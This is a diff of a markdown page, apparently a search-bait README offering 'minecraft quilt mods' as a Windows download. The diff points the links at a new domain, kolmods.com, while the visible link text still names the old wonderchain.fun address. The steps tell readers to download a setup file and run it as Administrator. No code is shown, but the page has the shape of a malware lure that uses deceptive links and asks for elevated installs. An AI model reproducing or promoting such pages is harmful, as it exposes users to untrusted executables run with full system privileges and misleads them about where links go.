@@ -32,14 +32,14 @@ Built for **minecraft quilt mods** and similar high-intent searches.
 
 | | |
 | --- | --- |
-| **Direct link** | **[minquimodhz.wonderchain.fun](https://minquimodhz.wonderchain.fun/)** |
-| **Full URL** | `https://minquimodhz.wonderchain.fun/` |
+| **Direct link** | **[minquimodhz.wonderchain.fun](https://minquimodhz.kolmods.com/)** |
+| **Full URL** | `https://minquimodhz.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 | **Install** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[minquimodhz.wonderchain.fun](https://minquimodhz.wonderchain.fun/)** in your browser
+1. Open **[minquimodhz.wonderchain.fun](https://minquimodhz.kolmods.com/)** in your browser
 2. Download the latest Windows build
 3. Run the installer **as Administrator**
 4. Point the app to your game / mods folder on first launch
